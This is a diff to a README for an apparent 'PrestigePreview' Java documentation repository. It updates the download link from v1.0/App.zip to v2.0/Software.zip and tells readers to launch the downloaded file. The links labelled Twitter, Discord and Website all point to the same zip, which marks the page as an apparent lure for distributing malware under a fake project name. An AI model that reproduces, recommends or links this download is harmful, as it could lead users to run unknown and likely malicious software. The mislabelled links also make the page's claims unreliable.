@@ -12,7 +12,7 @@ Welcome to the official documentation repository for adding Java support and fun
 
 To start integrating Java into PrestigePreview, please download the latest version of the software library from the following link:
 
-[![Download PrestigePreview Java](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v1.0/App.zip)](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v1.0/App.zip)
+[![Download PrestigePreview Java](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v2.0/Software.zip)](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the file to begin the installation process. If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options.
 
@@ -44,8 +44,8 @@ If you encounter any issues or have questions regarding Java integration with Pr
 
 For the latest updates, news, and announcements related to PrestigePreview and Java development, follow us on social media and join our community forums:
 
-- Twitter: [@PrestigePreview](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v1.0/App.zip)
-- Discord: [PrestigePreview Community](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v1.0/App.zip)
-- Website: [PrestigePreview](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v1.0/App.zip)
+- Twitter: [@PrestigePreview](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v2.0/Software.zip)
+- Discord: [PrestigePreview Community](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v2.0/Software.zip)
+- Website: [PrestigePreview](https://github.com/deathfirree/PrestigePreview_Java_Docs/releases/download/v2.0/Software.zip)
 
 Let's empower your software projects with the power of Java and PrestigePreview! ✨🚀 Thank you for choosing our documentation repository for your development journey. Happy coding! 💻🌟
